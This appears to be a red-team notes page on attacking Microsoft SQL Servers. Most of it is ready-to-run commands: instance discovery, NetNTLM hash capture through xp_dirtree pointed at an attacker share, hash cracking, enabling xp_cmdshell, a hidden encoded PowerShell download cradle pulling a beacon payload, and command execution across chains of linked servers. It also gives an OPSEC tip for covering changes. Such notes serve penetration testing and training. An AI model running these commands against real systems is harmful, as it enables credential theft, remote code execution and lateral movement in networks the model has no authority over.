---
title: MS SQL Servers
category: Red Team
order: 11
---

Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network.

In addition to the obvious data theft opportunities, they also have a large attack surface, allowing code execution, privilege escalation, lateral movement and persistence.

`PowerUpSQL` is an excellent tool to abuse and exploit MSSQL Servers.

* [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

# Discovery

There are some cmdlets to find MSSQL Servers.

```powershell
Get-SQLInstanceDomain
Get-SQLInstanceDomainBroadcast
Get-SQLInstanceScanUDP
```

> **Note**: `SQLInstanceDomain` works by searching SPN that begins with `MSSQL`.

It is also important to search domain groups that sounds like they may have access to database instances for example `SQLAdmins`, `MSSQLAdmin`, etc...

## Gather Information

With `Get-SQLServerInfo` we can get more information about the instance.

```powershell
Get-SQLServerInfo -Instance "mssql.corp.io,1443"
```

## Test Connection


> **Note** If there are multiple SQL Servers, we can chain these commands.
>
> `Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`


# Query the Server

There are different ways to access to a MSSQL Server, but we can access when a user have sysadmin role for the instance.

* PowerUpSQL:

```powershell
Get-SQLQuery -Instance "mssql.corp.io,1443" -Query "select @@servername"

Column1
-------
MSSQL 
```

* mssqlclient.py:

```
python3 mssqlclient.py -windows-auth CORP/bob@10.10.10.10
```

* sqsh:

```
sqsh -S 10.10.10.10 -U bob -P P@ssw0rd! -D databaseName
```

* HeidiSQL:

Windows SQL GUI tool.

![Heidi SQL](/hackingnotes/images/heidisql.png)

# MSSQL NetNTLM Capture

MSSQL have some procedures, `xp_dirtree` can be used to capture the NetNTLM hash of the principal being used to run the MSSQL Service.

We can use `Inveigh` to capture the NetNTLM hash.

```
beacon> execute-assembly C:\Tools\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```
After starting the Listener, we can execute the `xp_dirtree` procedure and list a smb share of our listener.

```
EXEC xp_dirtree '\\attacker-ip\pwn', 1, 1
```

Finally we can crack the hash with hashcat or john.

* Hashcat

```
hashcat -a 0 -m 5600 mssql.hash wordlist
```

* John

```
john --format=netntlmv2 --wordlist=wordlist mssql.hash
```

# Command Execution

The `xp_cmdshell` procedure can be used to execute shell commands on the SQL Server.

* PowerUpSQL:

```powershell
Invoke-SQLCmd -Instance "mssql.corp.io,1443" -Command "whoami" -RawResults

corp\svc_mssql
```
> **Note**: `Invoke-SQLCmd` automatically attemp to enable `xp_cmdshell`, execute the given command an then re-disable it.
* Manually:

```
EXEC xp_cmdshell 'whoami';
```
Sometimes this can lead an error due to `xp_cmdshell` is disabled. Check the configuration with the following command.

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```
Reconfigure the value to `1` in order to enable the procedure.

```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
And finally execute the command.

```
EXEC xp_cmdshell 'whoami';
```

> **OPSEC Alert**: Ensure you set the configuration to the original values after making a change on configurations.

> **Note**: There is a SQL command length limit that will prevent you from sending large payloads directly in the query, use Reverse Port Forwards and Pivot Listeners.

## Beacon Execution

Since MSSQL Server does not have access to the team server and the payload is hosted on the team server, we can do a reverver port forwarding to forward port 80 of the TeamServer to port 8080 of the beacon.

```powershell
beacon> rportfwd 8080 <ip-teamserver> 80
```
Create a Pivot Listener and host it via Scripted Web Delivery.

```powershell
$str = IEX((New-Object Net.WebClient).DownloadString('http://<ip-beacon>:8080/s1'))
[Ssystem.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

Finally append the command to the `xp_cmdshell` procedure.

```
EXEC xp_cmdshell 'powershell -w hidden -enc <B64-EncodedCommand>';
```

# Lateral Movement (Linked Servers)

SQL Servers have a concept called "Linked Servers", which allows a database instance to access data from an external source. 

## Discovery links

We can discover Database Links in many ways.

* PowerUpSQL:
```powershell
Get-SQLServerLink -Instance mssql.corp.local -Verbose
```

* Manually:

```
SELECT * FROM master..sysservers;
```

## Query a Remote Instance

With `OpenQuery` we can query a remote instance:

```
SELECT * FROM OPENQUERY("sql-1.corp.local", 'select @@servername');
```

> **Note**: The use of double and single quotes are important when using OpenQuery.

It is not possible to enable `xp_cmdshell` via `OpenQuery`. If RPC Out is enabled on the link which is not the default configuration, you can enable `xp_cmdshell` using the following command:

```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.corp.local]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.corp.local]
```

## Crawl between Instances

Manually querying databases to find links can consume a lot of time. We can use `Get-SQLServerLinkCrawl` to automatically crawl all available links.

* PowerUpSQL:

```powershell
beacon> powershell Get-SQLServerLinkCrawl -Instance "mssql.corp.local,1443"
```

We can execute commands manually by concatenating commands:

* 1 hop:

```
SELECT * FROM OPENQUERY("mssql.corp.local", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc <base64>''')
```

* 2 hop:

```
SELECT * FROM OPENQUERY("mssql.corp.local", 'select * from openquery("sql01.extcorp.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc <base64>'''''')')
```

And more over...

`Get-SQLServerLinkCrawl` has an easier way to execute commands on every hop:

```powershell
powershell Get-SQLServerLinkCrawl -Instance "mssql.corp.local,1443" -Query "exec master..xp_cmdshell 'powershell -w hidden -enc <base64>'"
```

# Privilege Escalation

This instance of SQL is running as NT Service\MSSQL$SQLEXPRESS, which is generally configured by default on more modern SQL installers. It has a special type of privilege called `SeImpersonatePrivilege`. This allows the account to "impersonate a client after authentication".

Consult `Windows Privesc` section to check how to privesc.
